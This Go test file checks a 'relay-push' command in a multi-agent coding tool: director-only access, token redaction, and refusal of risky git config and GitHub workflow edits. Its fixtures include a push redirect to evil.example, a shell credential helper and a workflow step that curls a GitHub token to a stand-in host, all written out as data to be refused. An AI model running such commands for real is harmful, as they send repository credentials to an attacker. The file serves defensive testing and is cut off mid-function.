package cli

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// relay-push tests (T-1618). The real git does every read; a git wrapper first on PATH records and fakes only `push`,
// and a gh stub answers `api .../git/ref/heads/main` and `auth token` (the process boundary, C1).

// relayToken is the fake HQ credential; deliberately not gh-token shaped, so only the exact-value redaction hides it.
var relayToken = strings.Join([]string{"fake", "relay", "cred", "7f3c9e1d"}, "-")

const relayGoodWF = `name: tests
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: run
        run: |
          echo hi
`

type relayRepo struct {
	e     *cliEnv
	wt    string
	stub  string
	main  string
	seq   int
	files map[string]string
}

func newRelayRepo(t *testing.T) *relayRepo {
	t.Helper()
	realGit, err := exec.LookPath("git")
	if err != nil {
		t.Skip("git not on PATH")
	}
	e := newCliEnvLive(t, false)
	root := t.TempDir()
	r := &relayRepo{e: e, wt: filepath.Join(root, "wt"), stub: filepath.Join(root, "stub")}
	os.MkdirAll(r.stub, 0o755)
	git := "#!/bin/sh\nprev=; cdir=.; for a in \"$@\"; do [ \"$prev\" = -C ] && cdir=$a; prev=$a; if [ \"$a\" = push ]; then\n" +
		"  printf '%s\\n' \"$*\" > \"" + r.stub + "/push.argv\"\n" +
		// where the push would really go: the URL after the push repo's own url.*.insteadOf rewrites
		"  (cd \"$cdir\" && " + realGit + " ls-remote --get-url https://github.com/acme/app.git) > \"" + r.stub + "/push.url\"\n" +
		"  [ \"$FACTORY_RELAY_TOKEN\" = \"" + relayToken + "\" ] && echo ok > \"" + r.stub + "/push.token\"\n" +
		"  env | grep -c '^GIT_TRACE' > \"" + r.stub + "/push.trace\"\n" +
		"  at=@\n  echo \"To https://x-access-token:$FACTORY_RELAY_TOKEN${at}github.com/acme/app.git\"\n" +
		"  echo \"remote: authenticated with $FACTORY_RELAY_TOKEN\" >&2\n" +
		"  [ -f \"" + r.stub + "/push.exit\" ] && exit \"$(cat \"" + r.stub + "/push.exit\")\"\n" +
		"  exit 0\nfi; done\nexec " + realGit + " \"$@\"\n"
	gh := "#!/bin/sh\nprintf '%s\\n' \"$*\" >> \"" + r.stub + "/gh.argv\"\n" +
		"case \"$1 $2\" in\n" +
		"  'api repos/acme/app/git/ref/heads/main') cat \"" + r.stub + "/main\";;\n" +
		"  'auth token') [ -f \"" + r.stub + "/notoken\" ] && { echo 'not logged in' >&2; exit 1; }\n" +
		// TOCTOU: plant a redirect in the worktree config after the relay read it (step 1), before the push (step 6)
		"    [ -f \"" + r.stub + "/plant\" ] && " + realGit + " -C \"" + r.wt + "\" config url.https://evil.example/.insteadOf https://github.com/\n" +
		"    echo " + relayToken + ";;\n" +
		"  *) echo \"unexpected gh $*\" >&2; exit 9;;\nesac\n"
	os.WriteFile(filepath.Join(r.stub, "git"), []byte(git), 0o755)
	os.WriteFile(filepath.Join(r.stub, "gh"), []byte(gh), 0o755)
	t.Setenv("PATH", r.stub+":"+os.Getenv("PATH"))
	t.Setenv("GIT_TRACE_CURL", "1") // must never reach the push
	gitIn(t, root, "init", "-q", "-b", "main", r.wt)
	r.write(".github/workflows/tests.yml", relayGoodWF)
	r.write("f.txt", "base\n")
	r.main = r.commit("base")
	os.WriteFile(filepath.Join(r.stub, "main"), []byte(r.main+"\n"), 0o644)
	gitIn(t, r.wt, "checkout", "-q", "-b", "factory/t-0001")
	e.sql("UPDATE tasks SET worktree=?, branch='factory/t-0001' WHERE id='T-0001'", r.wt)
	e.sql("UPDATE projects SET repo_path=? WHERE id='P-1'", r.wt)
	e.sql("INSERT OR REPLACE INTO config(key,value) VALUES('noreply_email','1+a@users.noreply.github.com')")
	// the public-text check: a fake owner term in a temp terms file (config, never the live one) and the HQ allowlist
	t.Setenv(relayTermsVar, "")
	terms := filepath.Join(root, "terms.txt")
	os.WriteFile(terms, []byte(relayTerm+"\n"), 0o600)
	e.sql("INSERT OR REPLACE INTO config(key,value) VALUES('scrub_terms_file',?)", terms)
	os.MkdirAll(filepath.Join(e.home, "ci"), 0o755)
	os.WriteFile(filepath.Join(e.home, "ci", "scrub_allowlist.txt"), []byte("# none\n"), 0o644)
	return r
}

// relayTermsVar is the owner-terms env var the guard reads; cleared so the machine's own terms never load in a test.
var relayTermsVar = strings.Join([]string{"SCRUB", "TERMS", "FILE"}, "_")

// relayTerm is the fake owner term in the test terms file.
const relayTerm = "zorblaxquent"

// mergeHead merges a side commit into the task branch with a --no-ff merge commit whose message is msg.
func (r *relayRepo) mergeHead(msg string) string {
	t := r.e.t
	t.Helper()
	gitIn(t, r.wt, "checkout", "-q", "-b", "side")
	r.write("side.txt", "side\n")
	r.commit("side work")
	gitIn(t, r.wt, "checkout", "-q", "factory/t-0001")
	cmd := exec.Command("git", "merge", "-q", "--no-ff", "-m", msg, "side")
	cmd.Dir = r.wt
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1",
		"GIT_AUTHOR_NAME=a", "GIT_AUTHOR_EMAIL=1+a@users.noreply.github.com",
		"GIT_COMMITTER_NAME=a", "GIT_COMMITTER_EMAIL=1+a@users.noreply.github.com",
		"GIT_AUTHOR_DATE=2026-11-12T00:00:00+0000", "GIT_COMMITTER_DATE=2026-11-12T00:00:00+0000")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("merge: %v\n%s", err, out)
	}
	return gitIn(t, r.wt, "rev-parse", "HEAD")
}

func (r *relayRepo) write(rel, text string) {
	p := filepath.Join(r.wt, rel)
	os.MkdirAll(filepath.Dir(p), 0o755)
	if err := os.WriteFile(p, []byte(text), 0o644); err != nil {
		r.e.t.Fatal(err)
	}
}

func (r *relayRepo) commit(msg string, extraEnv ...string) string {
	t := r.e.t
	t.Helper()
	gitIn(t, r.wt, "add", "-A")
	cmd := exec.Command("git", "commit", "-q", "--allow-empty", "-m", msg)
	cmd.Dir = r.wt
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1",
		"GIT_AUTHOR_NAME=a", "GIT_AUTHOR_EMAIL=1+a@users.noreply.github.com",
		"GIT_COMMITTER_NAME=a", "GIT_COMMITTER_EMAIL=1+a@users.noreply.github.com",
		"GIT_AUTHOR_DATE=2026-11-12T00:00:00+0000", "GIT_COMMITTER_DATE=2026-11-12T00:00:00+0000")
	cmd.Env = append(cmd.Env, extraEnv...)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("commit: %v\n%s", err, out)
	}
	return gitIn(t, r.wt, "rev-parse", "HEAD")
}

// head commits one change on the task branch (a workflow edit, or a plain file when wf is "").
func (r *relayRepo) head(wf string) string {
	r.seq++
	if wf != "" {
		r.write(".github/workflows/tests.yml", wf)
	}
	r.write("g.txt", strings.Repeat("x", r.seq)+"\n")
	return r.commit("work")
}

func (r *relayRepo) verify(sha string) {
	r.e.t.Helper()
	if out, errs, code := r.e.run("claude-director", "", "relay-push", "verify", "T-0001", sha, "--reason", "read the workflow diff"); code != 0 {
		r.e.t.Fatalf("verify: exit %d out %q err %q", code, out, errs)
	}
}

func (r *relayRepo) push(sha string) (string, string, int) {
	r.e.t.Helper()
	os.Remove(filepath.Join(r.stub, "push.argv"))
	return r.e.run("claude-director", "", "relay-push", "T-0001", sha)
}

func (r *relayRepo) pushed() string {
	b, _ := os.ReadFile(filepath.Join(r.stub, "push.argv"))
	return string(b)
}

func (r *relayRepo) noToken(t *testing.T, where string, texts ...string) {
	t.Helper()
	for _, s := range texts {
		if strings.Contains(s, relayToken) {
			t.Errorf("%s: the token leaked: %q", where, s)
		}
	}
}

func TestRelayPushRegistered(t *testing.T) {
	for _, a := range []string{"", "verify"} {
		if _, ok := registry[key{"relay-push", a}]; !ok {
			t.Errorf("relay-push %q is not registered", a)
		}
	}
}

// TestRelayPushHappyPath: verify then push sends exactly <sha>:refs/heads/factory/t-0001 to the GitHub URL with the
// HQ token in git's env only, and writes one relay-push events row. The token is in no output, argv or row.
func TestRelayPushHappyPath(t *testing.T) {
	r := newRelayRepo(t)
	sha := r.head(strings.Replace(relayGoodWF, "echo hi", "echo hello && make test", 1))
	r.verify(sha)
	out, errs, code := r.push(sha)
	if code != 0 || errs != "" {
		t.Fatalf("push: exit %d out %q err %q", code, out, errs)
	}
	if want := "relay-push T-0001: pushed " + sha + " to acme/app refs/heads/factory/t-0001 (2 files)\n"; out != want {
		t.Errorf("stdout %q, want %q", out, want)
	}
	argv := r.pushed()
	if !strings.HasSuffix(strings.TrimSpace(argv), "push --no-verify --porcelain https://github.com/acme/app.git "+sha+":refs/heads/factory/t-0001") {
		t.Errorf("push argv %q", argv)
	}
	if b, _ := os.ReadFile(filepath.Join(r.stub, "push.token")); string(b) != "ok\n" {
		t.Errorf("git push did not get the HQ token in FACTORY_RELAY_TOKEN")
	}
	if b, _ := os.ReadFile(filepath.Join(r.stub, "push.trace")); strings.TrimSpace(string(b)) != "0" {
		t.Errorf("GIT_TRACE* reached git push: %q", b)
	}
	if n := r.e.str("SELECT count(*) FROM events WHERE action='relay-push'"); n != "1" {
		t.Fatalf("relay-push events: %s", n)
	}
	var d struct {
		SHA, Branch, Repo, Pusher string
		Files                     []string
	}
	detail := r.e.str("SELECT detail FROM events WHERE action='relay-push'")
	if err := json.Unmarshal([]byte(detail), &d); err != nil {
		t.Fatalf("detail %q: %v", detail, err)
	}
	if d.SHA != sha || d.Branch != "factory/t-0001" || d.Repo != "acme/app" || d.Pusher != "claude-director" ||
		strings.Join(d.Files, ",") != ".github/workflows/tests.yml,g.txt" {
		t.Errorf("event detail %+v", d)
	}
	if a := r.e.str("SELECT actor||' '||entity||' '||entity_id FROM events WHERE action='relay-push'"); a != "claude-director task T-0001" {
		t.Errorf("event row %q", a)
	}
	all := r.e.str("SELECT group_concat(COALESCE(detail,''), '|') FROM events")
	r.noToken(t, "happy", out, errs, argv, all)
}

// TestRelayPushTokenRedacted: a failing push that echoes the token (stdout, stderr) is redacted, exits 1 and records
// no relay-push row.
func TestRelayPushTokenRedacted(t *testing.T) {
	r := newRelayRepo(t)
	sha := r.head("")
	r.verify(sha)
	os.WriteFile(filepath.Join(r.stub, "push.exit"), []byte("1"), 0o644)
	out, errs, code := r.push(sha)
	if code != 1 || !strings.Contains(errs, "git push failed") || !strings.Contains(out+errs, "[REDACTED]") {
		t.Fatalf("failed push: exit %d out %q err %q", code, out, errs)
	}
	if n := r.e.str("SELECT count(*) FROM events WHERE action='relay-push'"); n != "0" {
		t.Errorf("a failed push recorded %s rows", n)
	}
	r.noToken(t, "failed push", out, errs, r.pushed(), r.e.str("SELECT group_concat(COALESCE(detail,''), '|') FROM events"))
	if got := relayRedact("x https://u:ghp_"+strings.Repeat("k", 22)+"@"+"github.com y", ""); strings.Contains(got, "ghp_") || strings.Contains(got, "u:") {
		t.Errorf("pattern redaction: %q", got)
	}
}

func TestRelayPushVerifyRecord(t *testing.T) {
	r := newRelayRepo(t)
	sha := r.head("")
	other := r.head("")
	refused := func(name, want string) {
		t.Helper()
		out, errs, code := r.push(other)
		if code != 3 || !strings.Contains(errs, want) || r.pushed() != "" {
			t.Errorf("%s: exit %d out %q err %q pushed %q", name, code, out, errs, r.pushed())
		}
	}
	refused("no record", "no director verify record for "+other)
	r.verify(sha) // a different sha
	refused("other sha", "no director verify record for "+other)
	r.e.sql("INSERT INTO events(ts,actor,entity,entity_id,action,detail) VALUES('t','claude-lead','task','T-0001','relay-verify',?)", other+" forged")
	refused("non-director row", "no director verify record for "+other)
	r.e.sql("INSERT INTO events(ts,actor,entity,entity_id,action,detail) VALUES('t','claude-director','task','T-0002','relay-verify',?)", other+" x")
	refused("other task", "no director verify record for "+other)
	r.e.sql("INSERT INTO events(ts,actor,entity,entity_id,action,detail) VALUES('t','claude-director','task','T-0001','relay-verify',?)", other[:39]+" x")
	refused("prefix sha", "no director verify record for "+other)
	r.verify(other)
	if _, errs, code := r.push(other); code != 0 {
		t.Errorf("verified: exit %d err %q", code, errs)
	}
}

func TestRelayPushRoles(t *testing.T) {
	r := newRelayRepo(t)
	sha := r.head("")
	for _, tc := range []struct {
		agent string
		args  []string
	}{
		{"claude-coder", []string{"relay-push", "verify", "T-0001", sha, "--reason", "x"}},
		{"claude-lead", []string{"relay-push", "verify", "T-0001", sha, "--reason", "x"}},
		{"claude-boss", []string{"relay-push", "verify", "T-0001", sha, "--reason", "x"}},
		{"claude-coder", []string{"relay-push", "T-0001", sha}},
		{"claude-judge", []string{"relay-push", "T-0001", sha}},
		{"claude-lead", []string{"relay-push", "T-0001", sha}},
	} {
		out, errs, code := r.e.run(tc.agent, "", tc.args...)
		if code != 3 || out != "" || !strings.Contains(errs, "may not do this") && !strings.Contains(errs, "director-only") {
			t.Errorf("%s %v: exit %d out %q err %q", tc.agent, tc.args, code, out, errs)
		}
	}
	if n := r.e.str("SELECT count(*) FROM events WHERE action LIKE 'relay-%'"); n != "0" {
		t.Errorf("refused calls wrote %s rows", n)
	}
	// a director pane that says FACTORY_ROLE=coder is a worker
	r.e.env["FACTORY_ROLE"] = "coder"
	if _, errs, code := r.e.run("claude-director", "", "relay-push", "verify", "T-0001", sha, "--reason", "x"); code != 3 || !strings.Contains(errs, "director-only") {
		t.Errorf("FACTORY_ROLE=coder: exit %d err %q", code, errs)
	}
	delete(r.e.env, "FACTORY_ROLE")
	// the owner may verify and push
	if _, errs, code := r.e.run("owner", "", "relay-push", "verify", "T-0001", sha, "--reason", "owner looked"); code != 0 {
		t.Fatalf("owner verify: exit %d err %q", code, errs)
	}
	if _, errs, code := r.e.run("owner", "", "relay-push", "T-0001", sha); code != 0 {
		t.Errorf("owner push: exit %d err %q", code, errs)
	}
}

func TestRelayPushUsage(t *testing.T) {
	r := newRelayRepo(t)
	sha := r.head("")
	for _, args := range [][]string{
		{"relay-push"}, {"relay-push", "T-0001"}, {"relay-push", "T-0001", sha[:12]}, {"relay-push", "x", sha},
		{"relay-push", "T-0001", strings.ToUpper(sha)}, {"relay-push", "verify", "T-0001", sha},
		{"relay-push", "verify", "T-0001", sha, "--reason", "  "}, {"relay-push", "verify", "T-0001", sha, "--force"},
	} {
		out, errs, code := r.e.run("claude-director", "", args...)
		if code != 2 || out != "" || !strings.Contains(errs, "usage: factory relay-push") || r.e.execs != 0 {
			t.Errorf("%v: exit %d out %q err %q execs %d", args, code, out, errs, r.e.execs)
		}
	}
	if _, errs, code := r.e.run("claude-director", "", "relay-push", "verify", "T-9999", sha, "--reason", "x"); code != 2 || errs != "factory: no task T-9999\n" {
		t.Errorf("unknown task: exit %d err %q", code, errs)
	}
}

// TestRelayPushRepoRefusals: wrong branch, a head that does not contain main, foreign emails, risky worktree config, no
// HQ token.
func TestRelayPushRepoRefusals(t *testing.T) {
	r := newRelayRepo(t)
	check := func(name, sha, want string) {
		t.Helper()
		r.verify(sha)
		out, errs, code := r.push(sha)
		if code != 3 || !strings.Contains(errs, want) || r.pushed() != "" {
			t.Errorf("%s: exit %d out %q err %q pushed %q", name, code, out, errs, r.pushed())
		}
		r.noToken(t, name, out, errs)
	}
	sha := r.head("")
	r.e.sql("UPDATE tasks SET branch='factory/t-0001-v2' WHERE id='T-0001'")
	check("branch", sha, "the task's branch is 'factory/t-0001-v2', not factory/t-0001")
	r.e.sql("UPDATE tasks SET branch='factory/t-0001' WHERE id='T-0001'")

	// main moved on GitHub and the head does not contain it
	gitIn(t, r.wt, "checkout", "-q", "main")
	r.write("m.txt", "main moved\n")
	moved := r.commit("main moved")
	gitIn(t, r.wt, "checkout", "-q", "factory/t-0001")
	os.WriteFile(filepath.Join(r.stub, "main"), []byte(moved+"\n"), 0o644)
	check("parent", sha, "does not contain origin/main")
	// main only on GitHub, not fetched
	os.WriteFile(filepath.Join(r.stub, "main"), []byte(strings.Repeat("ab", 20)+"\n"), 0o644)
	check("main missing", sha, "is not in "+r.wt)
	os.WriteFile(filepath.Join(r.stub, "main"), []byte(r.main+"\n"), 0o644)

	r.write("h.txt", "x\n")
	check("author", r.commit("foreign author", "GIT_AUTHOR_EMAIL=someone@example.com"), "author email 'someone@example.com' is not the factory noreply")
	gitIn(t, r.wt, "reset", "-q", "--hard", sha)
	r.write("h.txt", "y\n")
	check("committer", r.commit("foreign committer", "GIT_COMMITTER_EMAIL=evil@example.com"), "committer email 'evil@example.com' is not the factory noreply")
	gitIn(t, r.wt, "reset", "-q", "--hard", sha)

	gitIn(t, r.wt, "config", "url.https://evil.example/.insteadOf", "https://github.com/")
	check("insteadOf", sha, "the worktree git config sets url.https://evil.example/.insteadof (local scope)")
	gitIn(t, r.wt, "config", "--unset", "url.https://evil.example/.insteadOf")
	gitIn(t, r.wt, "config", "credential.helper", "!echo password=x")
	check("credential", sha, "sets credential.helper (local scope)")
	gitIn(t, r.wt, "config", "--unset", "credential.helper")

	r.e.sql("UPDATE config SET value='' WHERE key='noreply_email'")
	check("noreply unknown", sha, "the factory noreply email is unknown")
	r.e.sql("UPDATE config SET value='1+a@users.noreply.github.com' WHERE key='noreply_email'")

	os.WriteFile(filepath.Join(r.stub, "notoken"), nil, 0o644)
	check("no token", sha, "the HQ gh has no github.com token")
	os.Remove(filepath.Join(r.stub, "notoken"))

	if _, errs, code := r.push(sha); code != 0 {
		t.Errorf("all fixed: exit %d err %q", code, errs)
	}
}

// TestRelayPushInsteadOfAfterCheck (reviewer B2, TOCTOU): a url.*.insteadOf planted in the worktree config after the
// relay read it is not obeyed: the push runs in an HQ-owned repo, its URL resolves to GitHub, and no token leaks.
func TestRelayPushInsteadOfAfterCheck(t *testing.T) {
	r := newRelayRepo(t)
	sha := r.head("")
	r.verify(sha)
	t.Setenv("TMPDIR", t.TempDir()) // the relay repo lands here, so the leftover check sees only this test
	os.WriteFile(filepath.Join(r.stub, "plant"), nil, 0o644)
	out, errs, code := r.push(sha)
	if code != 0 {
		t.Fatalf("push: exit %d out %q err %q", code, out, errs)
	}
	if got := gitIn(t, r.wt, "config", "--get", "url.https://evil.example/.insteadOf"); got != "https://github.com/" {
		t.Fatalf("the redirect was not planted: %q", got)
	}
	if b, _ := os.ReadFile(filepath.Join(r.stub, "push.url")); strings.TrimSpace(string(b)) != "https://github.com/acme/app.git" {
		t.Errorf("the push would go to %q, not GitHub", b)
	}
	argv := r.pushed()
	if strings.Contains(argv, r.wt) || !strings.Contains(argv, "factory-relay-") {
		t.Errorf("the push did not run in the relay repo: %q", argv)
	}
	if !strings.HasSuffix(strings.TrimSpace(argv), "https://github.com/acme/app.git "+sha+":refs/heads/factory/t-0001") {
		t.Errorf("push argv %q", argv)
	}
	if left, _ := filepath.Glob(filepath.Join(os.TempDir(), "factory-relay-*")); len(left) != 0 {
		t.Errorf("relay push repos left behind: %v", left)
	}
	r.noToken(t, "toctou", out, errs, argv, r.e.str("SELECT group_concat(COALESCE(detail,''), '|') FROM events"))
}

// TestRelayPushShallowIgnored (self-review): a .git/shallow planted in the worktree cannot hide a foreign-author
// commit from the checks, which read the relay repo (no shallow file) like the push does.
func TestRelayPushShallowIgnored(t *testing.T) {
	r := newRelayRepo(t)
	gitIn(t, r.wt, "checkout", "-q", "-b", "side", "main")
	r.write("y.txt", "y\n")
	r.commit("foreign", "GIT_AUTHOR_EMAIL=someone@example.com")
	r.write("x.txt", "x\n")
	x := r.commit("hides the parent")
	gitIn(t, r.wt, "checkout", "-q", "factory/t-0001")
	r.write("z.txt", "z\n")
	r.commit("work")
	cmd := exec.Command("git", "merge", "-q", "--no-ff", "-m", "merge side", "side")
	cmd.Dir = r.wt
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1",
		"GIT_AUTHOR_NAME=a", "GIT_AUTHOR_EMAIL=1+a@users.noreply.github.com",
		"GIT_COMMITTER_NAME=a", "GIT_COMMITTER_EMAIL=1+a@users.noreply.github.com")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("merge: %v\n%s", err, out)
	}
	sha := gitIn(t, r.wt, "rev-parse", "HEAD")
	gd := gitIn(t, r.wt, "rev-parse", "--absolute-git-dir")
	os.WriteFile(filepath.Join(gd, "shallow"), []byte(x+"\n"), 0o644)
	if n := gitIn(t, r.wt, "log", "--format=%ae", r.main+".."+sha); strings.Contains(n, "someone@example.com") {
		t.Fatalf("the planted shallow file does not hide the commit in the worktree: %q", n)
	}
	r.verify(sha)
	if out, errs, code := r.push(sha); code != 3 || !strings.Contains(errs, "author email 'someone@example.com'") || r.pushed() != "" {
		t.Errorf("shallow: exit %d out %q err %q pushed %q", code, out, errs, r.pushed())
	}
}

// relayWF swaps old for new in the good workflow.
func relayWF(t *testing.T, old, new string) string {
	t.Helper()
	if !strings.Contains(relayGoodWF, old) {
		t.Fatalf("fixture has no %q", old)
	}
	return strings.Replace(relayGoodWF, old, new, 1)
}

// TestRelayPushWorkflowRefusals: every forbidden workflow change, through the CLI, is refused and pushes nothing.
func TestRelayPushWorkflowRefusals(t *testing.T) {
	r := newRelayRepo(t)
	base := gitIn(t, r.wt, "rev-parse", "HEAD")
	for _, tc := range []struct{ name, wf, want string }{
		{"secrets expr", relayWF(t, "        run: |\n", "        env:\n          T: ${{ secrets.DEPLOY }}\n        run: |\n"), "secrets reference added"},
		{"secrets in a script comment", relayWF(t, "          echo hi\n", "          echo hi\n          # ${{ secrets.DEPLOY }}\n"), "secrets reference added"},
		{"secrets inherit", relayWF(t, "  test:\n", "  call:\n    uses: ./.github/workflows/x.yml\n    secrets: inherit\n  test:\n"), "secrets reference added"},
		{"permissions write", relayWF(t, "contents: read", "contents: write"), "permissions changed"},
		{"permissions removed", relayWF(t, "permissions:\n  contents: read\n", ""), "permissions changed (removed)"},
		{"job permissions", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    permissions: write-all\n"), "permissions changed (added)"},
		{"pull_request_target", relayWF(t, "  pull_request:\n", "  pull_request_target:\n"), "on: trigger changed"},
		{"workflow_run", relayWF(t, "  push:\n", "  workflow_run:\n    workflows: [x]\n  push:\n"), "workflow_run added"},
		{"inline on", relayWF(t, "on:\n  pull_request:\n  push:\n    branches: [main]\n", "on: [pull_request, push]\n"), "on: trigger changed"},
		{"self-hosted", relayWF(t, "runs-on: ubuntu-latest", "runs-on: self-hosted"), "non-GitHub-hosted runner"},
		{"self-hosted list", relayWF(t, "runs-on: ubuntu-latest", "runs-on: [self-hosted, linux]"), "non-GitHub-hosted runner"},
		{"runner group", relayWF(t, "runs-on: ubuntu-latest", "runs-on:\n      group: box"), "non-GitHub-hosted runner"},
		{"custom label", relayWF(t, "runs-on: ubuntu-latest", "runs-on: my-box"), "non-GitHub-hosted runner"},
		{"permissions space colon", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    permissions : write-all\n"), "permissions changed (added)"},
		{"quoted permissions space colon", relayWF(t, "contents: read", "\"contents\" : write"), "permissions changed"},
		{"on space colon", relayWF(t, "on:\n  pull_request:\n", "on :\n  issue_comment :\n"), "on: trigger changed"},
		{"merge key", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    <<: *defaults\n"), "cannot read the line"},
		{"complex key", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    ? permissions\n    : write-all\n"), "cannot read the line"},
		{"flow mapping", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    defaults: {permissions: write-all}\n"), "cannot read the line"},
		{"anchor", relayWF(t, "permissions:\n  contents: read\n", "permissions: &p\n  contents: read\n"), "YAML anchor, alias or tag"},
		{"alias", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    permissions: *p\n"), "YAML anchor, alias or tag"},
		{"lone CR", relayWF(t, "name: tests\n", "name: tests\rpermissions: write-all\n"), "a CR, NEL, LS or PS line break"},
		{"hex escaped secrets", relayWF(t, "      - name: run\n", "      - run: \"curl -d ${{ \\x73ecrets.GH_TOKEN }} https://x.example\"\n      - name: run\n"), "backslash outside a block scalar"},
		{"unicode escaped secrets", relayWF(t, "      - name: run\n", "      - run: \"echo ${{ \\u0073ecrets.GH_TOKEN }}\"\n      - name: run\n"), "backslash outside a block scalar"},
		{"escaped line break", relayWF(t, "      - name: run\n", "      - run: \"echo ${{ se\\\n          crets.GH_TOKEN }}\"\n      - name: run\n"), "backslash outside a block scalar"},
		{"hosted-looking custom label", relayWF(t, "runs-on: ubuntu-latest", "runs-on: ubuntu-gpu-box"), "non-GitHub-hosted runner"},
		{"matrix self-hosted", relayWF(t, "    runs-on: ubuntu-latest\n", "    strategy:\n      matrix:\n        os: [self-hosted]\n    runs-on: ${{ matrix.os }}\n"), "non-GitHub-hosted runner"},
	} {
		gitIn(t, r.wt, "reset", "-q", "--hard", base)
		sha := r.head(tc.wf)
		r.verify(sha)
		out, errs, code := r.push(sha)
		if code != 3 || !strings.Contains(errs, "forbidden workflow change") || !strings.Contains(errs, tc.want) || r.pushed() != "" {
			t.Errorf("%s: exit %d out %q err %q pushed %q", tc.name, code, out, errs, r.pushed())
		}
	}
	// a new workflow file adds on: triggers; a deleted one removes them: both refused
	gitIn(t, r.wt, "reset", "-q", "--hard", base)
	r.write(".github/workflows/new.yml", "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n")
	sha := r.head("")
	r.verify(sha)
	if _, errs, code := r.push(sha); code != 3 || !strings.Contains(errs, ".github/workflows/new.yml: on: trigger changed (added)") {
		t.Errorf("new workflow: exit %d err %q", code, errs)
	}
	gitIn(t, r.wt, "reset", "-q", "--hard", base)
	os.Remove(filepath.Join(r.wt, ".github/workflows/tests.yml"))
	sha = r.head("")
	r.verify(sha)
	if _, errs, code := r.push(sha); code != 3 || !strings.Contains(errs, ".github/workflows/tests.yml: on: trigger changed (removed)") ||
		!strings.Contains(errs, "permissions changed (removed)") {
		t.Errorf("deleted workflow: exit %d err %q", code, errs)
	}
	if n := r.e.str("SELECT count(*) FROM events WHERE action='relay-push'"); n != "0" {
		t.Errorf("refused pushes wrote %s rows", n)
	}
	// unit cases the line reader must not miss
	for name, wf := range map[string]string{
		"upper SECRETS": relayWF(t, "echo hi", "echo ${{ SECRETS.DEPLOY }}"),
		"json document": `{"on":{"issue_comment":{}},"permissions":{"contents":"write"},"jobs":{}}`,
		"flow on":       "name: x\n{on: [issue_comment]}\n",
	} {
		if p := workflowProblems(relayGoodWF, wf); len(p) == 0 {
			t.Errorf("%s: not refused", name)
		}
	}
}

// TestRelayPushMoreRefusals: a head equal to main adds nothing; a bad project slug refuses before any git or gh call.
func TestRelayPushMoreRefusals(t *testing.T) {
	r := newRelayRepo(t)
	r.verify(r.main)
	if _, errs, code := r.push(r.main); code != 3 || !strings.Contains(errs, "adds no commit over origin/main") {
		t.Errorf("no commit: exit %d err %q", code, errs)
	}
	sha := r.head("")
	r.verify(sha)
	r.e.sql("UPDATE projects SET gh_repo='evil' WHERE id='P-1'")
	if _, errs, code := r.push(sha); code != 3 || !strings.Contains(errs, "its project has no valid gh_repo ('evil')") || r.pushed() != "" {
		t.Errorf("bad slug: exit %d err %q", code, errs)
	}
}

// TestRelayPushWorkflowAllowed: step, script, hosted-runner and non-workflow changes pass; a self-hosted runner on a
// push-only workflow is not fork-reachable.
func TestRelayPushWorkflowAllowed(t *testing.T) {
	r := newRelayRepo(t)
	base := gitIn(t, r.wt, "rev-parse", "HEAD")
	for _, tc := range []struct{ name, wf string }{
		{"script", relayWF(t, "echo hi", "echo hi\n          go test ./...")},
		{"step", relayWF(t, "      - name: run\n", "      - uses: actions/setup-go@v5\n        with:\n          go-version: '1.27'\n      - name: run\n")},
		{"hosted runner", relayWF(t, "runs-on: ubuntu-latest", "runs-on: ubuntu-24.04")},
		{"hosted list", relayWF(t, "runs-on: ubuntu-latest", "runs-on: [ubuntu-22.04]")},
		{"hosted arm and macos", relayWF(t, "runs-on: ubuntu-latest", "runs-on: [ubuntu-24.04-arm, macos-15, windows-2025]")},
		{"backslash in a block scalar", relayWF(t, "echo hi", "go test \\\n            ./...")},
		{"name", relayWF(t, "name: tests", "name: tests and lint")},
		{"no workflow", ""},
	} {
		gitIn(t, r.wt, "reset", "-q", "--hard", base)
		sha := r.head(tc.wf)
		r.verify(sha)
		if out, errs, code := r.push(sha); code != 0 || r.pushed() == "" {
			t.Errorf("%s: exit %d out %q err %q", tc.name, code, out, errs)
		}
	}
	pushOnly := "on:\n  push:\n    branches: [main]\njobs:\n  a:\n    runs-on: ubuntu-latest\n"
	if p := workflowProblems(pushOnly, strings.Replace(pushOnly, "ubuntu-latest", "[self-hosted, linux]", 1)); len(p) != 0 {
		t.Errorf("push-only self-hosted: %v", p)
	}
	if p := workflowProblems(pushOnly, strings.Replace(pushOnly, "    runs-on", "    if: ${{ always() }}\n    runs-on", 1)); len(p) != 0 {
		t.Errorf("unrelated job key: %v", p)
	}
	// a script line that merely looks like a key, inside a block scalar, is content of run:
	wf := "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo 1\n"
	if p := workflowProblems(wf, strings.Replace(wf, "echo 1", "echo 1\n          on: x", 1)); len(p) != 0 {
		t.Errorf("block scalar: %v", p)
	}
}

// TestRelayPushPublicText: the pre-push public-text check runs over every commit message, identity and added line of
// main..sha. A merge commit whose message holds a home path is refused (exit 3, the commit and pattern id named, the
// matched text not); an owner term in an added line or a commit message is refused; a clean merge history passes. A
// missing terms file or allowlist refuses (fail closed). Nothing is pushed or recorded on a refusal.
func TestRelayPushPublicText(t *testing.T) {
	r := newRelayRepo(t)
	base := gitIn(t, r.wt, "rev-parse", "HEAD")
